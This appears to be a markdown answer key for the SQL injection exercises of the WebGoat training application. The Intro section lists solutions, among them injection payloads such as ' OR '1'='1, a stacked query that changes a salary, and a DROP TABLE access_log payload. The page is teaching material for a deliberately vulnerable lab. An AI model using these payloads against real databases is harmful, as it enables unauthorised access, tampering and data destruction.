# A1 Injection

This page will tell you how to get set up these excercises and the right answers to complete them. The following results are achieved while working on Kali Linux 2021.3 installed using [this guide](https://github.com/tonikerttula/APE/blob/main/Kali.md) and WebGoat 8.0.0.M26 installed using [this guide.](https://github.com/tonikerttula/APE/blob/main/webgoat.md)

All exercises are working without problems, if installation guides were followed properly. Ahead will be the guide how to complete the exercises, so try yourself first before looking!

Another great place for practicing SQL Injection is in SQL ZOO! (https://sqlzoo.net/wiki/SQL_Tutorial) 


### Intro

2. __SQL query:__ SELECT department FROM employees WHERE first_name='Bob'
3. __SQL query:__ UPDATE employees SET department='Sales' WHERE first_name='Tobi'
4. __SQL query:__ ALTER TABLE employees ADD phone varchar(20)
5. __SQL query:__ GRANT ALTER TABLE TO UnauthorizedUser
9. __SELECT * FROM users_data FIRST_NAME = 'John' and Last_NAME = '__ ' + or + '1'='1
10. __Login_count:__ 0    __User_Id:__ 0 OR 1=1
11. __Employee Name:__ A    __Authentication TAN:__ ' OR '1' = '1
12. __Employee Name:__ A    __Authentication TAN:__ '; UPDATE employees SET salary=99999 WHERE first_name='John
13. __Action contains:__ %'; DROP TABLE access_log;--


### Advanced
Tested, excercises 3 and 6 are working without problems. They are just waiting to be solved. Excersise n.5 needs a little more checking for multiple completion methods.

### Mitigation
Tested excersises 5 and 6, they are working without problems. I couldn't solve excercise 10 yet, so I haven't tested it.
